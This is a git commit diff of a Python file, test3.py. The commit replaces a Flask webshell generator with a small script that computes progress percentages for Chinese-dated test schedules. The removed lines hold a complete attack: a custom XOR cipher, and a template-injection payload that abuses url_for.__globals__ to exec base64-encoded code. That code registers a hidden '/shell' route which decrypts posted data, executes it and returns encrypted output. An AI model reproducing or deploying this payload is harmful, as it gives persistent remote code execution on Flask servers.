9cc2159fd50ea0c1951b76c1faee8be43579892b
Luke <39611448+luke10481@users.noreply.github.com>
2026-01-04 00:16:04 +0800

    1

--- test3.py
+++ test3.py
@@ -1,84 +1,52 @@
-import base64
-import hashlib
-import random
-class RandXor(object):
-    """ 加解密 """
-    def __init__(self, shell_password, salt='mewoshell'):
-        self.shell_password = shell_password
-        self.salt = salt
-        self.key = self.generate_key()
-        self.rkey = len(self.shell_password)
+import datetime
+import re
 
-    def get_md5(self, data):
-        md5 = hashlib.md5()
-        md5.update(data.encode('utf-8'))
-        return md5.hexdigest()
-    def generate_key(self):
-        """ 异或key """
-        return hashlib.sha256(self.get_md5(self.shell_password)[8:24].encode()).digest()
 
-    def encrypt(self, plaintext):
-        plaintext = base64.b64decode(plaintext)
-        ciphertext = bytearray(len(plaintext))
-        random.seed(self.rkey)
-        for i in range(len(plaintext)):
-            ciphertext[i] = plaintext[i] ^ self.rkey
-            ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ self.key[i % len(self.key)]
-        ciphertext = base64.b64encode(ciphertext).decode('utf-8')
-        return ciphertext
+def parse_date(date_str):
+    match = re.match(r'(\d+)年(\d+)月(\d+)日', date_str)
+    if match:
+        return int(match.group(1)), int(match.group(2)), int(match.group(3))
+    return None
 
-    def decrypt(self, ciphertext):
-        ciphertext = base64.b64decode(ciphertext)
-        plaintext = bytearray(len(ciphertext))
-        random.seed(self.rkey)
-        for i in range(len(ciphertext)):
-            plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ self.key[i % len(self.key)]
-            plaintext[i] = plaintext[i] ^ self.rkey
-        plaintext = base64.b64encode(plaintext).decode('utf-8')
-        return plaintext
+def get_progress_list(today_date, plan_list):
+    #current_year = today_date.year
+    progress_list = []
+    for i , plan in enumerate(plan_list):
+        date_part, name_part = plan.split('\n')
+        start_str, end_str = date_part.split('-')
+        start_str = start_str.strip()
+        end_str = end_str.strip()
+        start_year, start_month, start_day = parse_date(start_str)
+        end_year, end_month, end_day = parse_date(end_str)
+        start_date = datetime.date(start_year, start_month, start_day)
+        end_date = datetime.date(end_year, end_month, end_day)
+        if i ==1:
+            pass
+        if today_date < start_date:
+            status = '未开始'
+            progress = 0
+        elif today_date > end_date:
+            status = '已完成'
+            progress = 100
+        else:
+            status = '进行中'
+            if today_date < start_date:
+                progress = 0
+            elif today_date > end_date:
+                progress = 100
+            else:
+                total_days = (end_date - start_date).days + 1
+                passed_days = (today_date - start_date).days + 1
+                progress = int((passed_days / total_days) * 100)
+        progress_list.append([status,progress])
+    return progress_list
 
-payload = """
-import os
-resp = os.popen('calc')
-"""
-rx = RandXor('pass' , 'mewoshell')
-print('password:', 'pass', rx.get_md5('pass'))
-print('异或key（base64）:', base64.b64encode(rx.key).decode('utf-8'))
-print('随机数种子:', rx.rkey)
-payload = base64.b64encode(payload.encode('utf-8'))
-encrypted = rx.encrypt(payload)
-print('加密结果:', encrypted)
-print('解密结果:', base64.b64decode(rx.decrypt(encrypted)).decode('utf-8'))
+if __name__ == "__main__":
 
-shell = f"""
-def shell_func():
-    import base64
-    import random
-    import urllib.request
-    parma = {{'resp': 'Error', 'app': app, 'gl': ulg}}
-    p_code = request.get_data(as_text=True)
-    ciphertext = base64.b64decode(p_code)
-    plaintext = bytearray(len(ciphertext))
-    rkey = {str(rx.rkey)}
-    key = base64.b64decode('{base64.b64encode(rx.key).decode('utf-8')}')
-    random.seed(rkey)
-    for i in range(len(ciphertext)):
-        plaintext[i] = ciphertext[i] ^ (random.randint(1, len(ciphertext)) & 0xff) ^ key[i % len(key)]
-        plaintext[i] = plaintext[i] ^ rkey
-    exec(plaintext, parma)
-    plaintext = str(parma['resp']).encode('utf-8')
-    ciphertext = bytearray(len(plaintext))
-    random.seed(rkey)
-    for i in range(len(plaintext)):
-        ciphertext[i] = plaintext[i] ^ rkey
-        ciphertext[i] = ciphertext[i] ^ (random.randint(1, len(plaintext)) & 0xff) ^ key[i % len(key)]
-    parma['resp'] = base64.b64encode(ciphertext).decode('utf-8')
-    return str(parma['resp']+f'&key={{rx.key}}')
-"""
-output = f"""
-url_for.__globals__['__builtins__']['exec'](
-    "exec(__import__('base64').b64decode('{base64.b64encode(shell.encode('utf-8')).decode('utf-8')}'));app.view_functions['shell'] = shell_func;app._got_first_request=False;app.add_url_rule('/shell', 'shell', shell_func, methods=['POST','GET']);app._got_first_request=True;", 
-    {{'request':url_for.__globals__['request'],'ulg': url_for.__globals__, 'app':url_for.__globals__['current_app']}}
-)
-"""
-print(output)
+    today_date = datetime.date.today()
+    today_date = datetime.date(2026, 1, 11)
+    plan_list = ['2025年12月8日 - 2026年1月10日\n第一轮测试(3个工作日)',
+                 '2026年1月11日 - 2026年1月19日\n第一轮测试(7个工作日)',
+                 '2026年1月20日 - 2026年1月26日\n第一轮测试(7个工作日)']
+    p=get_progress_list(today_date, plan_list)
+    print(p)
